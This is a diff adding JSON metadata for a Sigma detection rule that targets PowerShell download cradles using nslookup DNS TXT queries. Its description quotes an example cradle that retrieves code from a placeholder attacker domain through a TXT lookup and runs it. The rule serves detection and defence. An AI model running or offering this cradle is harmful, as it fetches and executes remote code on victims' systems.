@@ -1,0 +1,24 @@
+{
+  "uuid": "8a2a91ef-b9af-457a-9184-84d6f6c8c2ef",
+  "title": "Nslookup PwSh Download Cradle",
+  "format": "sigma",
+  "author": "Zach Mathis (@yamatosecurity)",
+  "license": "GPL-2.0",
+  "license_verified": true,
+  "description": "This rule tries to detect powershell download cradles, e.g. powershell . (nslookup -q=txt http://some.owned.domain.com)[-1]",
+  "source": "https://github.com/HydraDragonAntivirus/HydraDragonAntivirus",
+  "tags": [
+    "tlp:clear",
+    "PAP:CLEAR",
+    "misp-galaxy:operating-system=\"Windows\"",
+    "ms-caro-malware-full:malware-platform=\"Win32\""
+  ],
+  "attack_techniques": [
+    "T1071.004",
+    "T1105"
+  ],
+  "cve": [],
+  "created_at": "2026-09-10",
+  "last_modified": "2026-09-10",
+  "rulezet_url": "https://rulezet.org/rule/detail_rule/365415"
+}
